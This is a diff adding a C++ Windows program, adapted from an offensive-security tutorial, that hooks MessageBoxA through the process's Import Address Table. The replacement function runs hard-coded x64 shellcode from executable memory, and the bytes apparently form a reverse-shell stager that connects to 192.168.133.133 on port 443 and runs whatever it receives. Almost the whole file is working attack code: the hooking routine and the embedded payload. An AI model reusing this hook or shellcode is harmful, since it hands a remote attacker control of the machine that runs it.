@@ -1,0 +1,116 @@
+#include <iostream>
+#include <Windows.h>
+#include <winternl.h>
+
+// original code - https://www.ired.team/offensive-security/code-injection-process-injection/import-adress-table-iat-hooking
+
+// define MessageBoxA prototype
+using PrototypeMessageBox = int (WINAPI*)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
+
+// remember memory address of the original MessageBoxA routine
+PrototypeMessageBox originalMsgBox = MessageBoxA;
+
+// hooked function with malicious code that eventually calls the original MessageBoxA
+int hookedMessageBox(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)
+{
+	unsigned char shellcode[] =
+		"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
+		"\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
+		"\x8b\x52\x20\x51\x56\x48\x8b\x72\x50\x4d\x31\xc9\x48\x0f"
+		"\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+		"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
+		"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
+		"\x74\x67\x48\x01\xd0\x44\x8b\x40\x20\x50\x49\x01\xd0\x8b"
+		"\x48\x18\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
+		"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
+		"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
+		"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
+		"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x48\x01"
+		"\xd0\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
+		"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
+		"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
+		"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
+		"\x89\xe5\x49\xbc\x02\x00\x01\xbb\xc0\xa8\x85\x85\x41\x54"
+		"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
+		"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
+		"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
+		"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
+		"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
+		"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
+		"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
+		"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
+		"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
+		"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
+		"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
+		"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
+		"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
+		"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
+		"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
+		"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
+		"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
+		"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
+		"\xf0\xb5\xa2\x56\xff\xd5";
+	
+	void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(exec, shellcode, sizeof shellcode);
+	((void(*)())exec)();
+
+	// execute the original NessageBoxA
+	return originalMsgBox(hWnd, lpText, lpCaption, uType);
+}
+
+int main()
+{
+	// message box before IAT unhooking
+	MessageBoxA(NULL, "Hello Before Hooking", "Hello Before Hooking", 0);
+
+	LPVOID imageBase = GetModuleHandleA(NULL);
+	PIMAGE_DOS_HEADER dosHeaders = (PIMAGE_DOS_HEADER)imageBase;
+	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)imageBase + dosHeaders->e_lfanew);
+
+	PIMAGE_IMPORT_DESCRIPTOR importDescriptor = NULL;
+	IMAGE_DATA_DIRECTORY importsDirectory = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+	importDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(importsDirectory.VirtualAddress + (DWORD_PTR)imageBase);
+	LPCSTR libraryName = NULL;
+	HMODULE library = NULL;
+	PIMAGE_IMPORT_BY_NAME functionName = NULL;
+
+	while (importDescriptor->Name != NULL)
+	{
+		libraryName = (LPCSTR)importDescriptor->Name + (DWORD_PTR)imageBase;
+		library = LoadLibraryA(libraryName);
+
+		if (library)
+		{
+			PIMAGE_THUNK_DATA originalFirstThunk = NULL, firstThunk = NULL;
+			originalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor->OriginalFirstThunk);
+			firstThunk = (PIMAGE_THUNK_DATA)((DWORD_PTR)imageBase + importDescriptor->FirstThunk);
+
+			while (originalFirstThunk->u1.AddressOfData != NULL)
+			{
+				functionName = (PIMAGE_IMPORT_BY_NAME)((DWORD_PTR)imageBase + originalFirstThunk->u1.AddressOfData);
+
+				// find MessageBoxA address
+				if (std::string(functionName->Name).compare("MessageBoxA") == 0)
+				{
+					SIZE_T bytesWritten = 0;
+					DWORD oldProtect = 0;
+					VirtualProtect((LPVOID)(&firstThunk->u1.Function), 8, PAGE_READWRITE, &oldProtect);
+
+					// swap MessageBoxA address with address of hookedMessageBox
+					firstThunk->u1.Function = (DWORD_PTR)hookedMessageBox;
+				}
+				++originalFirstThunk;
+				++firstThunk;
+			}
+		}
+
+		importDescriptor++;
+	}
+
+	// message box after IAT hooking
+	MessageBoxA(NULL, "Hello after Hooking", "Hello after Hooking", 0);
+
+	return 0;
+}
